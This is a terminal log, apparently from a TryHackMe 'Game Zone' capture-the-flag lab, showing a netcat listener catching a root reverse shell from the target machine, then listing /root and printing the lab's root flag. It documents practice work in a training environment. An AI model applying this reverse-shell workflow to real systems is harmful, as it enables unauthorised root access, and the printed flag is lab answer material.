
```sh
┌──(kali㉿kali)-[~/thm/gamezone]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.186.198] 48774
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
root@gamezone:/usr/share/webmin/file/# cd /
cd /
root@gamezone:/# cd root
cd root
root@gamezone:~# ls
ls
root.txt
root@gamezone:~# ls -la
ls -la
total 24
drwx------  3 root root 4096 Aug 16  2019 .
drwxr-xr-x 23 root root 4096 Aug 16  2019 ..
lrwxrwxrwx  1 root root    9 Aug 16  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Aug 16  2019 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 16  2019 root.txt
root@gamezone:~# cat root.txt
cat root.txt
a4b945830144bdd71908d12d902adeee
root@gamezone:~# 

```